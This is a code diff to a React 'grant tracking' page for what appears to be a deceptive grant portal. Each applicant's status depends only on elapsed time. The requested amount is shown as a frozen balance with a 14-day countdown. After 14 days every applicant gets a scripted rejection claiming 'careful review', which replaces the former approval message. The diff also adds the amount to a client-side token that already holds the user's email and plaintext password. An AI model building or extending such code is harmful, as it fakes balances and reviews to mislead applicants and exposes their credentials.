@@ -141,7 +141,7 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
     return Math.max(0, daysRemaining);
   };
 
-  // Calculate grant status: 0-24hrs = Setup (0.00 with 24hr countdown), 24hrs-14days = Frozen/Locked (show amount with 14-day countdown), 14+ days = Received
+  // Calculate grant status: 0-24hrs = Setup (0.00), 24hrs-14days = Frozen (show amount), 14+ days = Review Complete (rejection/denial message)
   const calculateGrantStatus = (timestamp: string) => {
     const applicationDate = new Date(timestamp);
     const now = new Date();
@@ -151,14 +151,14 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
     // Phase 1: First 24 hours - account initialization (amount shows as 0.00)
     const isInitializing = hoursElapsed < 24;
     
-    // Phase 2: 24 hours to 14 days - frozen/locked state (show the actual amount from the form)
+    // Phase 2: After 24 hours to 14 days - frozen/locked state (show amount with 14-day countdown)
     const isFrozen = hoursElapsed >= 24 && daysElapsed < 14;
     
-    // Phase 3: After 14 days total - received/active state
-    const isReceived = daysElapsed >= 14;
+    // Phase 3: After 14 days - review complete (rejection/denial message, account still locked)
+    const isReviewComplete = daysElapsed >= 14;
     
     // Calculate countdown for current phase
-    let daysRemaining = 14; // Default to 14 day countdown
+    let daysRemaining = 14;
     let hoursRemaining = 0;
     let minutesRemaining = 0;
     let progressPercentage = 0;
@@ -184,8 +184,8 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
       minutesRemaining = Math.floor(((remainingHoursInFrozenPhase % 1) * 60));
       progressPercentage = Math.min(100, (daysAfterSetup / 14) * 100); // Progress during 14 day frozen period
       dayNumber = Math.min(14, Math.ceil(daysAfterSetup)); // Days 1-14 of frozen period
-    } else if (isReceived) {
-      // Phase 3: Complete - grant is received and active
+    } else if (isReviewComplete) {
+      // Phase 3: Review complete - no more countdown
       daysRemaining = 0;
       hoursRemaining = 0;
       minutesRemaining = 0;
@@ -203,10 +203,11 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
       isAwaitingVerification: false, // No longer used - replaced by isFrozen
       isFrozen, // 24hrs-14 days (show amount frozen/locked)
       isProcessing: false, // No longer used
-      isReceived, // After 14 days complete
+      isReviewComplete, // After 14 days (rejection/denial message)
+      isReceived: false, // No longer used
       progressPercentage,
       dayNumber,
-      phase: isInitializing ? 'setup' : isFrozen ? 'frozen' : 'received'
+      phase: isInitializing ? 'setup' : isFrozen ? 'frozen' : 'reviewComplete'
     };
   };
 
@@ -219,6 +220,7 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
         e: app.email,  // email (required for cross-browser)
         p: app.password,  // password (required for cross-browser)
         g: app.grantCategory,  // grant category (required to track which grant)
+        a: app.amount,  // amount (required for balance display)
         t: app.timestamp  // timestamp (critical - was resetting before)
       });
 
@@ -291,6 +293,7 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
       const email = minimalData.e;
       const password = minimalData.p;
       const grantCategory = minimalData.g;
+      const amount = minimalData.a;  // Amount from passkey (from form submission)
       const timestamp = minimalData.t;  // This MUST NOT change
       
       // Try to find full account data in localStorage for this browser
@@ -318,7 +321,7 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
         phone: '',
         country: '',
         grantCategory: grantCategory,  // From passkey - exact
-        amount: '',
+        amount: amount || '',  // Amount from passkey (from form submission)
         purpose: '',
         applicantWork: '',
         usage: '',
@@ -953,14 +956,18 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
               {/* Countdown Timer at Top */}
               {(() => {
                 const status = calculateGrantStatus(trackingState.currentUser?.timestamp || '');
+                
+                // Hide timer when review is complete
+                if (status.isReviewComplete) {
+                  return null;
+                }
+                
                 return (
                   <motion.div
                     className={`rounded-3xl p-6 sm:p-8 text-white font-black text-center transition-all border-2 ${
                       status.isInitializing 
                         ? 'bg-gradient-to-r from-blue-600 to-blue-700 border-blue-400/50' 
-                        : status.isFrozen 
-                        ? 'bg-gradient-to-r from-amber-600 to-orange-600 border-amber-400/50' 
-                        : 'bg-gradient-to-r from-emerald-600 to-teal-600 border-emerald-400/50'
+                        : 'bg-gradient-to-r from-amber-600 to-orange-600 border-amber-400/50'
                     }`}
                     animate={{ scale: [1, 1.01, 1] }}
                     transition={{ duration: 3, repeat: Infinity }}
@@ -1071,11 +1078,11 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
                       <div className="flex flex-col sm:flex-row sm:items-start sm:justify-between gap-6">
                         <div className="flex-1 min-w-0">
                           <p className="text-xs text-slate-500 dark:text-slate-400 font-semibold uppercase tracking-wide mb-3">
-                            {status.isInitializing ? 'Account Balance (Initializing)' : status.isFrozen ? 'Frozen Amount (Locked)' : 'Available Balance'}
+                            {status.isInitializing ? 'Account Balance (Initializing)' : status.isFrozen ? 'Frozen Amount (Locked)' : status.isReviewComplete ? 'Application Status' : 'Available Balance'}
                           </p>
                           <div className="flex items-baseline gap-3 flex-wrap">
                             <span className="text-4xl sm:text-5xl font-black text-slate-900 dark:text-white break-words">
-                              {privacySettings.hideBalance ? '••••' : status.isInitializing ? '$0.00' : `$${formatAmount(trackingState.currentUser?.amount)}`}
+                              {privacySettings.hideBalance ? '••••' : status.isInitializing ? '$0.00' : status.isReviewComplete ? '❌' : `$${formatAmount(trackingState.currentUser?.amount)}`}
                             </span>
                             <button
                               onClick={() => setPrivacySettings({...privacySettings, hideBalance: !privacySettings.hideBalance})}
@@ -1089,7 +1096,7 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
                         <div className="sm:text-right">
                           <p className="text-xs text-slate-500 dark:text-slate-400 font-semibold uppercase tracking-wide mb-2">Account Status</p>
                           <p className="text-lg sm:text-base font-black text-slate-900 dark:text-white">
-                            {status.isInitializing ? '🔒 Setup' : status.isFrozen ? '🔒 Frozen' : '✅ Active'}
+                            {status.isInitializing ? '🔒 Setup' : status.isFrozen ? '🔒 Frozen' : status.isReviewComplete ? '❌ Not Approved' : '✅ Active'}
                           </p>
                         </div>
                       </div>
@@ -1106,7 +1113,7 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
                         <p className="text-lg sm:text-xl font-black text-slate-900 dark:text-white">
                           {(() => {
                             const status = calculateGrantStatus(trackingState.currentUser?.timestamp || '');
-                            return status.isInitializing ? '🔒 Setup' : status.isFrozen ? '🔒 Frozen' : '✅ Active';
+                            return status.isInitializing ? '🔒 Setup' : status.isFrozen ? '🔒 Frozen' : status.isReviewComplete ? '❌ Not Approved' : '✅ Active';
                           })()}
                         </p>
                       </div>
@@ -1138,43 +1145,98 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
                       </div>
                     )}
 
-                    {status.isAwaitingVerification && (
-                      <div className="flex items-start gap-4">
-                        <div className="flex-shrink-0 w-12 h-12 rounded-lg bg-amber-100 dark:bg-amber-800/30 flex items-center justify-center">
-                          <Lock className="text-amber-600 dark:text-amber-400" size={24} />
-                        </div>
-                        <div className="flex-1 min-w-0">
-                          <p className="font-semibold text-slate-900 dark:text-white text-sm sm:text-base">Phase 2: Wallet Frozen/Locked</p>
-                          <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">Day {status.dayNumber} of 14 — Your grant amount is displayed and locked. {Math.round(status.progressPercentage)}% complete</p>
-                        </div>
-                      </div>
-                    )}
-
                     {status.isFrozen && (
                       <div className="flex items-start gap-4">
                         <div className="flex-shrink-0 w-12 h-12 rounded-lg bg-amber-100 dark:bg-amber-800/30 flex items-center justify-center">
                           <Lock className="text-amber-600 dark:text-amber-400" size={24} />
                         </div>
                         <div className="flex-1 min-w-0">
-                          <p className="font-semibold text-slate-900 dark:text-white text-sm sm:text-base">Phase 2: Wallet Frozen/Locked</p>
+                          <p className="font-semibold text-slate-900 dark:text-white text-sm sm:text-base">Phase 2: Application Review</p>
                           <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">Day {status.dayNumber} of 14 — Your grant amount is displayed and locked. {Math.round(status.progressPercentage)}% complete</p>
                         </div>
                       </div>
                     )}
 
-                    {status.isReceived && (
+                    {status.isReviewComplete && (
                       <div className="flex items-start gap-4">
-                        <div className="flex-shrink-0 w-12 h-12 rounded-lg bg-slate-100 dark:bg-slate-800 flex items-center justify-center">
-                          <CheckCircle2 className="text-slate-600 dark:text-slate-400" size={24} />
+                        <div className="flex-shrink-0 w-12 h-12 rounded-lg bg-rose-100 dark:bg-rose-800/30 flex items-center justify-center">
+                          <AlertCircle className="text-rose-600 dark:text-rose-400" size={24} />
                         </div>
                         <div className="flex-1 min-w-0">
-                          <p className="font-semibold text-slate-900 dark:text-white text-sm sm:text-base">Phase 3: Completed</p>
-                          <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">Your grant has been approved and is ready for withdrawal</p>
+                          <p className="font-semibold text-slate-900 dark:text-white text-sm sm:text-base">Phase 3: Review Decision</p>
+                          <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">Your application review has been completed. Please see details below for the outcome.</p>
                         </div>
                       </div>
                     )}
                   </div>
                 );
+              })()}
+
+              {/* Rejection/Denial Message - After Review Complete */}
+              {(() => {
+                const status = calculateGrantStatus(trackingState.currentUser?.timestamp || '');
+                if (status.isReviewComplete) {
+                  return (
+                    <div className="bg-gradient-to-br from-rose-50 to-orange-50 dark:from-rose-950/30 dark:to-orange-950/30 border-2 border-rose-200 dark:border-rose-700 rounded-2xl p-6 sm:p-8 space-y-4">
+                      <div className="flex items-start gap-4">
+                        <div className="flex-shrink-0">
+                          <AlertCircle size={32} className="text-rose-600 dark:text-rose-400 flex-shrink-0 mt-1" />
+                        </div>
+                        <div className="flex-1 min-w-0">
+                          <h3 className="text-xl sm:text-2xl font-black text-rose-900 dark:text-rose-200 mb-2">Application Review Complete</h3>
+                          <p className="text-sm sm:text-base text-rose-800 dark:text-rose-300 leading-relaxed mb-4">
+                            Thank you for submitting your application. After careful review of your details and qualifications, we regret to inform you that you do not meet the eligibility requirements for this grant opportunity at this time.
+                          </p>
+                          
+                          <div className="bg-white/50 dark:bg-slate-900/50 rounded-xl p-4 space-y-3 mb-4">
+                            <h4 className="font-bold text-rose-900 dark:text-rose-200 text-sm">Possible Reasons:</h4>
+                            <ul className="text-sm text-rose-800 dark:text-rose-300 space-y-2">
+                              <li className="flex items-start gap-2">
+                                <span className="text-rose-600 dark:text-rose-400 font-bold flex-shrink-0">•</span>
+                                <span>Your qualifications or experience did not align with the program requirements</span>
+                              </li>
+                              <li className="flex items-start gap-2">
+                                <span className="text-rose-600 dark:text-rose-400 font-bold flex-shrink-0">•</span>
+                                <span>Your application did not meet the minimum eligibility criteria</span>
+                              </li>
+                              <li className="flex items-start gap-2">
+                                <span className="text-rose-600 dark:text-rose-400 font-bold flex-shrink-0">•</span>
+                                <span>There were concerns regarding the project feasibility or sustainability</span>
+                              </li>
+                              <li className="flex items-start gap-2">
+                                <span className="text-rose-600 dark:text-rose-400 font-bold flex-shrink-0">•</span>
+                                <span>Funding allocated to other candidates with stronger applications</span>
+                              </li>
+                            </ul>
+                          </div>
+                          
+                          <div className="bg-blue-50 dark:bg-blue-950/30 border border-blue-200 dark:border-blue-700 rounded-xl p-4 space-y-3">
+                            <h4 className="font-bold text-blue-900 dark:text-blue-200 text-sm">Next Steps:</h4>
+                            <ul className="text-sm text-blue-800 dark:text-blue-300 space-y-2">
+                              <li className="flex items-start gap-2">
+                                <span className="text-blue-600 dark:text-blue-400 font-bold flex-shrink-0">✓</span>
+                                <span>Review the feedback provided and consider addressing the gaps for future applications</span>
+                              </li>
+                              <li className="flex items-start gap-2">
+                                <span className="text-blue-600 dark:text-blue-400 font-bold flex-shrink-0">✓</span>
+                                <span>Explore other grant opportunities that may better align with your profile</span>
+                              </li>
+                              <li className="flex items-start gap-2">
+                                <span className="text-blue-600 dark:text-blue-400 font-bold flex-shrink-0">✓</span>
+                                <span>Contact our support team if you believe this is an error or for clarification</span>
+                              </li>
+                            </ul>
+                          </div>
+                          
+                          <p className="text-xs text-rose-600 dark:text-rose-400 font-semibold mt-4">
+                            We appreciate your interest and encourage you to apply for other opportunities in the future. For questions, please contact our support team.
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+                  );
+                }
+                return null;
               })()}
 
               {/* Transfer Section */}
@@ -1187,14 +1249,14 @@ const GrantTracking: React.FC<GrantTrackingProps> = ({ onNavigate }) => {
                       Transfer Funds
                     </h3>
                     
-                    {status.isInitializing || status.isFrozen ? (
+                    {status.isInitializing || status.isFrozen || status.isReviewComplete ? (
                       <div className="space-y-3">
                         <div className="bg-slate-100 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-lg p-3 sm:p-4 flex gap-3">
                           <Lock size={18} className="text-slate-600 dark:text-slate-400 flex-shrink-0 mt-0.5" />
                           <div className="flex-1 min-w-0">
                             <p className="text-sm sm:text-base font-black text-slate-900 dark:text-white mb-1">Account Locked</p>
                             <p className="text-xs sm:text-sm text-slate-700 dark:text-slate-300">
-                              {status.isInitializing ? 'Transfers are unavailable during account setup. Available after this phase is complete.' : 'Transfers are unavailable while your grant amount is frozen. Available after the frozen period ends.'}
+                              {status.isInitializing ? 'Transfers are unavailable during account setup. Available after this phase is complete.' : status.isFrozen ? 'Transfers are unavailable while your grant amount is frozen. Available after the frozen period ends.' : 'Your application was not approved. Transfers are not available.'}
                             </p>
                           </div>
                         </div>
